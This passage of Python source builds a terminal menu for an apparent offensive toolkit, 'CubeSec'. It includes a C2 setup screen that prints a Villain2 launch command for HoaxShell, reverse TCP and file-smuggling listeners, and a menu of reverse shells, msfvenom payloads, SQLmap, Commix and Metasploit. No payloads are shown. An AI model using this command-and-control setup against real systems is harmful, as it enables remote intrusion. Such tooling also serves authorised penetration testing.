        title=f"[bold {RED}]C2 Setup[/bold {RED}]",
        border_style=RED_DIM,
    ))
    console.print()

    # Config prompts — TUI-matched styling
    c2_port = Prompt.ask(f"[bold {RED}]Core C2 Port[/bold {RED}]", default="6501")
    hoax_port = Prompt.ask(f"[bold {RED}]HoaxShell Port[/bold {RED}]", default="8080")
    tcp_port = Prompt.ask(f"[bold {RED}]Reverse TCP Port[/bold {RED}]", default="4443")
    file_port = Prompt.ask(f"[bold {RED}]File Smuggler Port[/bold {RED}]", default="8888")

    console.clear(); banner()

    # Display launch summary
    console.print(Rule(f"[bold {RED}]C2 Deployment[/bold {RED}]", style=RED_DIM))
    console.print()

    summary = Table(border_style=RED_DIM, header_style=f"bold {RED_BRT}")
    summary.add_column("Service", style=RED_BRT)
    summary.add_column("Port", style=INK)
    summary.add_column("Status", style=RED_BRT)
    summary.add_row("Core C2", c2_port, "ready")
    summary.add_row("HoaxShell HTTP", hoax_port, "ready")
    summary.add_row("Reverse TCP", tcp_port, "ready")
    summary.add_row("File Smuggler", file_port, "ready")
    console.print(summary)
    console.print()

    # Deployment instructions
    console.print(Panel(
        Syntax(
            f"python3 Villain2.py -p {c2_port} -x {hoax_port} -n {tcp_port} -f {file_port}",
            "bash", theme="monokai", line_numbers=False
        ),
        title=f"[bold {RED}]Launch Command[/bold {RED}]",
        border_style=RED_DIM,
    ))
    console.print()

    console.print(f"[{MUTED}]Run the command above in your CubeSec_C2/villain directory.[/{MUTED}]")
    console.print(f"[{MUTED}]C2 will accept callbacks and manage multi-handler sessions.[/{MUTED}]")
    console.print()

    pause()

def main_menu():
    cats = [
        "Reverse Shell",
        "Msfvenom Payloads And Encoders",
        "SQLmap              Injection",
        "Commix              Injection",
        "Metasploit          Commands",
        "Listeners & Handlers",
        "Shell Sessions      (Multi-Handler)",
        "Shell Upgrade       Reference",
        "C2 Server",
    ]
    actions = [browse_reverse_shells, browse_msfvenom,
               browse_sqlmap, browse_commix, browse_metasploit,
               browse_listeners, shell_sessions_menu,
               show_upgrade_reference, c2_server]

    while True:
        sel = card_grid("CubeSec Main Menu", cats, back_label="✕ Exit")
        if sel is None:
            continue
        if sel == 0:
            console.print(f"\n[{RED_BRT}]Exiting CubeSec...[/{RED_BRT}]")
            return
        actions[sel - 1]()

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print(f"\n[{RED}]Interrupted[/{RED}]")
